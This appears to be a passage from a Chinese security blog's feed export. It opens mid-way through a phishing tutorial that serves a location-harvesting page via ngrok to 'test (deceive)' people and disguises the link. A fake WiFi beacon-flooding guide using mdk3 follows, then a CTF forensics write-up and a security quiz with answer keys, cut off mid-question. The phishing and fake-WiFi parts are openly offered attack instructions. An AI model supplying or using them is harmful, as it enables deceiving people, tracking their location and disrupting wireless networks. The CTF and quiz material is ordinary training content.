https:&#x2F;&#x2F;www.baidu.com&#x2F;&#x2F;自己随便写个都行，我这里是选择跳转到百度</span><br></pre></td></tr></table></figure><p>接着打开ngrok（这里我们使用http协议、8080端口，运行后他就会生成链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ngrok http 8080</span><br></pre></td></tr></table></figure><p>最后我们只需要将其发给我们想要测(you)试(pian)的人就完事了，那个链接你可以改成短链接看过去没那么假（掩耳盗铃.jpg）</p><p>真以为这玩意这么牛掰吗？你还忘了点啥老哥，对方得同意你获取其地理位置权限你才能得到对方相关信息！</p><p>效果图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/image-20210409213148926.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/21251856665478.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/777202112612221021494645.png"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钓鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次生成虚假WiFi</title>
      <link href="2021/04/09/howtomakejiaWIFI/"/>
      <url>2021/04/09/howtomakejiaWIFI/</url>
      
        <content type="html"><![CDATA[<blockquote><p>无论什么战斗，光靠防守是赢不了的，想要赢，就必须攻击</p></blockquote><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>kali + 无线网卡</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><p>首先我们需要装一下mkd3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install mdk3</span><br></pre></td></tr></table></figure><p>接着连下我们的无线网卡</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021040912342649536.png"></p><p>然后我们 iwconfig 查看下是否真的连上</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202104095266224656789.png"></p><p>添加mon0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iw wlan0 interface add mon0 type monitor</span><br><span class="line">iwconfig 检测一下是否成功</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210421524416126972.png"></p><p>填写WiFi名字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi wifi.lst</span><br><span class="line">输入i进行编辑（如果你不知道的话我给你提醒一下</span><br><span class="line">输入你想要取的WiFi名字</span><br><span class="line">Ctrl+C 然后 :wq或者:x实现保存并退出（如果你不知道的话我给你提醒一下</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021040914614449.png"></p><p>最后生成WiFi</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdk3 mon0 b -f wifi.lst</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/202104095582996.png"></p><p>so easy！你也来试试⑧（大佬勿喷~</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WiFi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红明谷杯数据安全大赛技能场景赛 2021</title>
      <link href="2021/04/02/2021hmgbctf/"/>
      <url>2021/04/02/2021hmgbctf/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这比赛个人感觉得杂项得天下（再多做出一个杂项我们就能进决赛了呀.jpg</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210402221912.png"></p><p>我们就是第14~  阿巴阿巴阿巴</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/55543125064657497.png" alt="装个逼"></p><h2 id="InputMonitor"><a href="#InputMonitor" class="headerlink" title="InputMonitor"></a>InputMonitor</h2><blockquote><p>Akira在某次取证的过程中，在桌面找到了一个奇怪的文件，但是除此之外好像没有找到什么有价值的情报，很多的数据都被抹干净了，而且这个用户似乎根本就没装什么第三方的软件。Akira还粗心的只拷贝了C盘下的User目录，这下还有机会解开可疑文件吗？</p><p><a href="https://pan.baidu.com/s/1l79sUCGe393kGELdoXyTEA">附件</a>（提取码：ehdy）</p></blockquote><p>第一次做取证的题目记录一下</p><p>首先我们得搜索目标用户，在其桌面文件处发现flag文件（一个加密的包；并提示我们说监控我输入</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210402425265621041.png"></p><p>贴个参考文章：<a href="http://www.huaxindc.com/ztxy/ztjc/2020/1028/19459.html">http://www.huaxindc.com/ztxy/ztjc/2020/1028/19459.html</a></p><p>接着我们需要找寻密码，找到文件 ChsPinyinlH.dat 或 ChsPinyinUDL.dat（咱也不知道.dat文件是啥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hmgb2021ChsPinyinIHdat.png"></p><p>找到1400h处，其后便是每4个字节是字数，后面四个不知道，再四个是输入次数，再24字节是内容，再24字节也是内容，以此为一个循环；之后又重新开始循环（就等于一个struct 链表</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2377878882782421.png"></p><p>utf16转一下进而得到密码：有志者事竟成（PS：直接用CyberChef会快些</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210402251088812566455.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4594594646.png"></p><p>或者利用工具得到密码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/20210402412524514145561.png"></p><p>最后成功得到hidden.pdf，打开之后编辑图片即可看到flag：flag{Y0u_F1nd_h1dd3n_m3g}</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2021040219679197713.png"></p><h2 id="赛后复现"><a href="#赛后复现" class="headerlink" title="赛后复现"></a>赛后复现</h2><h3 id="我的心是冰冰的"><a href="#我的心是冰冰的" class="headerlink" title="我的心是冰冰的"></a>我的心是冰冰的</h3><p> Java盲水印得到压缩包密码：gnibgnib</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar BlindWatermark-v0.0.3-windows-x86_64.jar decode -c bingbing.jpg pass.jpg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/hmgbbingbingpass.jpg"></p><p>解出一个流量包，wireshark打开得知是USB流量</p><p> tshark + USB Keyboard Data Hacker + hex解码得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">tshark.exe -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class="line"></span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000060000000000</span><br><span class="line">0000230000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000240000000000</span><br><span class="line">0000240000000000</span><br><span class="line">0000050000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000250000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">00002a0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000230000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000250000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000270000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000270000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000240000000000</span><br><span class="line">0000070000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">666c61677b38663965643266393333656631346138643035323364303334396531323939637d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;</span><br></pre></td></tr></table></figure><h3 id="歪比歪比"><a href="#歪比歪比" class="headerlink" title="歪比歪比"></a>歪比歪比</h3><p>010打开发现是个流量包，wireshark打开发现关键信息（知道是哈夫曼但是没做.jpg</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/81345614970.jpg"></h3><p>跑下脚本即可得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Decode result:jz7ezl64pjhgx6iun78roljc01bm72vjr7u44dfh9tewz8auzmzdzypet4d9xcehxspktdcgxgeeybmgva5pp9850b9mceifedlos6rehy8isvpzf6u545y50c4y9avuvqq3g1epi6igd6tciby7hep9o33cm3guo4qvcxqpcg6zdi5i1r6mmj6xcq5ummzm6jiniidbn51kppj15dp3zy4o8pww23kggukjrytosbkx8th00zba777e0kkz9e1te3u5i36fiym3pran1zgp2a192x63mnc35dhocqli21s2qby9htvdp82x9t6ai0n0wkvbl080bj3xzpj5m8a3jn67kh0le8v104lwa155n8n5o7y97ypdw6hv7d6rbkppxb3ktxnhttb29zsehww2u2x0fhb2k2p1uafhwrfgx7vha64xjr2ffewd30n9961ozt8dgdikly8cknf36kbh2chj28xrencflag&#123;5rd477a2-6r36-dra9-9d63-49c2e9e5d1e5&#125;f43x61l9v3de9z0hiwfz30l1keik5vx48m4yrausvae6fq1q7b9yb4s4tzqbbkyy2hizvqg26spral8rkz37cuylk1k0wfy8p4zppjujggcvpv9e0nhfopumxecd4zbo5sc76zpx8kvttaohud4ltdw16vmgfgucfw2nnafkuup4a6sgkxpk4nw0ax65j6w2498qoap2pqf4el1tu79k6jagxq4q7injr6pkz8yroz25ymdv7uq8h3k24mgf63gmld1i1jga7yupef74l95xr11l1yemjscrn313u89ilrpm8cfj8x826igbfmfnw98qdkm8i3z1vj8ajsebab9w9afhaccvd8qsv2u8zcohp6bxkjonpfoio896q01vje9o2jp00snunzj6zandlq7l8hldsct3ha4dawq9lq8t3u34fmkxrmwd8o4tmow3028o1rqcjzkg9mubjwr5byx7hn44o38vd50</span><br><span class="line"></span><br><span class="line">#flag&#123;5rd477a2-6r36-dra9-9d63-49c2e9e5d1e5&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4125664125557178524.png"></p><p><strong>附上脚本</strong>（脚本来源于网络）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 统计字符出现频率，生成映射表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_frequency</span>(<span class="params">text</span>):</span></span><br><span class="line">    chars = []</span><br><span class="line">    ret = []</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            chars.append(char)</span><br><span class="line">            ret.append((char, text.count(char)))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 节点类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, frequency</span>):</span></span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line">        self.father = <span class="literal">None</span></span><br><span class="line">        self.frequency = frequency</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_left</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.father.left == self</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 创建叶子节点</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_nodes</span>(<span class="params">frequency_list</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [Node(frequency) <span class="keyword">for</span> frequency <span class="keyword">in</span> frequency_list]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 创建Huffman树</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_huffman_tree</span>(<span class="params">nodes</span>):</span></span><br><span class="line">    queue = nodes[:]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(queue) &gt; <span class="number">1</span>:</span><br><span class="line">        queue.sort(key=<span class="keyword">lambda</span> item: item.frequency)</span><br><span class="line">        node_left = queue.pop(<span class="number">0</span>)</span><br><span class="line">        node_right = queue.pop(<span class="number">0</span>)</span><br><span class="line">        node_father = Node(node_left.frequency + node_right.frequency)</span><br><span class="line">        node_father.left = node_left</span><br><span class="line">        node_father.right = node_right</span><br><span class="line">        node_left.father = node_father</span><br><span class="line">        node_right.father = node_father</span><br><span class="line">        queue.append(node_father)</span><br><span class="line"> </span><br><span class="line">    queue[<span class="number">0</span>].father = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> queue[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Huffman编码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">huffman_encoding</span>(<span class="params">nodes, root</span>):</span></span><br><span class="line">    huffman_code = [<span class="string">&#x27;&#x27;</span>] * <span class="built_in">len</span>(nodes)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nodes)):</span><br><span class="line">        node = nodes[i]</span><br><span class="line">        <span class="keyword">while</span> node != root:</span><br><span class="line">            <span class="keyword">if</span> node.is_left():</span><br><span class="line">                huffman_code[i] = <span class="string">&#x27;0&#x27;</span> + huffman_code[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                huffman_code[i] = <span class="string">&#x27;1&#x27;</span> + huffman_code[i]</span><br><span class="line">            node = node.father</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> huffman_code</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 编码整个字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_str</span>(<span class="params">text, char_frequency, codes</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> char_frequency:</span><br><span class="line">            <span class="keyword">if</span> char == item[<span class="number">0</span>]:</span><br><span class="line">                ret += codes[i]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 解码整个字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_str</span>(<span class="params">huffman_str, char_frequency, codes</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> huffman_str != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> codes:</span><br><span class="line">            <span class="keyword">if</span> item <span class="keyword">in</span> huffman_str <span class="keyword">and</span> huffman_str.index(item) == <span class="number">0</span>:</span><br><span class="line">                ret += char_frequency[i][<span class="number">0</span>]</span><br><span class="line">                huffman_str = huffman_str[<span class="built_in">len</span>(item):]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    text = raw_input(<span class="string">&#x27;The text to encode:&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    char_frequency = [(<span class="string">&#x27;j&#x27;</span>, <span class="number">29</span>), (<span class="string">&#x27;z&#x27;</span>, <span class="number">31</span>), (<span class="string">&#x27;7&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;e&#x27;</span>, <span class="number">31</span>), (<span class="string">&#x27;l&#x27;</span>, <span class="number">23</span>), (<span class="string">&#x27;6&#x27;</span>, <span class="number">37</span>), (<span class="string">&#x27;4&#x27;</span>, <span class="number">32</span>), (<span class="string">&#x27;p&#x27;</span>, <span class="number">38</span>), (<span class="string">&#x27;h&#x27;</span>, <span class="number">27</span>), (<span class="string">&#x27;g&#x27;</span>, <span class="number">26</span>), (<span class="string">&#x27;x&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;i&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="number">27</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;8&#x27;</span>, <span class="number">36</span>), (<span class="string">&#x27;0&#x27;</span>, <span class="number">24</span>), (<span class="string">&#x27;o&#x27;</span>, <span class="number">23</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;y&#x27;</span>, <span class="number">24</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="number">29</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">26</span>), (<span class="string">&#x27;m&#x27;</span>, <span class="number">27</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;v&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;d&#x27;</span>, <span class="number">33</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;9&#x27;</span>, <span class="number">33</span>), (<span class="string">&#x27;t&#x27;</span>, <span class="number">21</span>), (<span class="string">&#x27;w&#x27;</span>, <span class="number">22</span>), (<span class="string">&#x27;a&#x27;</span>, <span class="number">31</span>), (<span class="string">&#x27;r&#x27;</span>, <span class="number">24</span>), (<span class="string">&#x27;s&#x27;</span>, <span class="number">16</span>), (<span class="string">&#x27;k&#x27;</span>, <span class="number">32</span>), (<span class="string">&#x27;5&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;q&#x27;</span>, <span class="number">23</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="number">32</span>), (<span class="string">&#x27;&#123;&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;-&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;&#125;&#x27;</span>, <span class="number">1</span>)]</span><br><span class="line"> </span><br><span class="line">    nodes = create_nodes([item[<span class="number">1</span>] <span class="keyword">for</span> item <span class="keyword">in</span> char_frequency])</span><br><span class="line">    root = create_huffman_tree(nodes)</span><br><span class="line">    codes = huffman_encoding(nodes, root)</span><br><span class="line"> </span><br><span class="line">    huffman_str = <span class="string">&#xx27;</span></span><br><span class="line"> </span><br><span class="line">    origin_str = decode_str(huffman_str, char_frequency, codes)</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Encode result:&#x27;</span> + huffman_str</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Decode result:&#x27;</span> + origin_str</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红明谷杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红明谷杯安全意识赛 2021</title>
      <link href="2021/04/02/2021%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86%E8%B5%9B/"/>
      <url>2021/04/02/2021%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>“红明谷”杯数据安全大赛-安全意识赛<br>试卷时间：2021-04-02 10:00:00 - 2021-04-02 11:30:00<br>试卷说明：安全意识赛，每题5分，总分500分</p></blockquote><p>一、单项选择题<br>1、以下不属于采用密码技术对数据本身进行保护的是（）。<br>A、防火墙技术<br>B、使用现代加密算法对数据进行加密以获得机密性<br>C、采用数字签名算法确保数据源的可靠性<br>D、采用杂凑算法和公钥算法保护数据完整性<br>标准答案：A<br>2、第二级信息系统抽查不包括哪项<br>A、存储被测系统重要数据的介质的存放环境<br>B、所有人员<br>C、重要管理终端<br>D、信息安全主管人员、各方面的负责人员；<br>标准答案：B<br>3、对于采用账户名/口令的网站，在已知用户名的情况下对用户口令进行爆破穷举。该口令包含8个字符，且所有的字符属于字母表的小写字符，该穷举（）个字符组合来获得口令？<br>A、21224576<br>B、208827064576<br>C、201520162818<br>D、20445276162016<br>标准答案：B<br>4、《网络安全法》是以第（）号主席令正式发布的。<br>A、五十三<br>B、五十四<br>C、五十五<br>D、五十六<br>标准答案：A<br>5、Diffie和Hellman观察到：世界上存在一些很容易完成，但反过来很难完成的行为，称这样的行为具有()<br>A、耦合性<br>B、单向性<br>C、拟合性<br>D、混沌性<br>标准答案：B<br>6、数据安全的主要技术手段是采用（）手段来对数据进行主动防护。<br>A、数据云存储手段<br>B、随意存储手段<br>C、即时接收存储手段<br>D、现代信息储存手段<br>标准答案：D<br>7、下列不属于资产中的信息载体的是（）。<br>A、软件<br>B、硬件<br>C、固件<br>D、机房<br>标准答案：D<br>8、近年来常有不法分子通过IP欺诈来进行网络诈骗，通常不法分子不会通过（）这样的攻击手段来完成IP欺骗的实施<br>A、Non-Blind Spoofing<br>B、Blind Spoofing<br>C、ACK Flooding<br>D、Man in the Middle at Tack<br>标准答案：C<br>9、对于违法行为的通报批评处罚，属于行政处罚中的是（）<br>A、人身自由罚<br>B、声誉罚<br>C、财产罚<br>D、资格罚<br>标准答案：B<br>10、世界上第一款军用级网络攻击武器是以下哪种木马病毒？<br>A、Triton病毒<br>B、火炎病毒（Flame)<br>C、震网病毒<br>D、沙蒙病毒（Shamoon)<br>标准答案：C<br>11、工业互联网的核心是（ ）<br>A、网络体系<br>B、应用体系<br>C、平台体系<br>D、用户体系<br>标准答案：C<br>12、()是信息系统等级确定的第三步<br>A、确定定级对象<br>B、信息系统等级评审<br>C、初步确定信息系统等级<br>D、信息系统等级的最终确定与审批<br>标准答案：B<br>13、关于安全单元测评结果汇总表符号描述错误的是<br>A、对勾表示<br>B、三角形表示待定<br>C、叉表示不符合<br>D、“N/A”表示“不适用”<br>标准答案：B<br>14、PC4R模型是一种工业互联网安全自适应防护模型，组成这个模型的步骤不包括（ )<br>A、信息感知<br>B、风险评定<br>C、数据汇集<br>D、网络融合<br>标准答案：B<br>15、对第五级信息系统，应当由___进行检查<br>A、公安部<br>B、知名学者委员会<br>C、有资质的安全企业<br>D、国家指定的专门部门<br>标准答案：D<br>16、工业互联网木马病毒肆虐，其中我们常见的Industroyer病毒支持的工业控制协议有（）<br>A、OPC DA Process Control Data 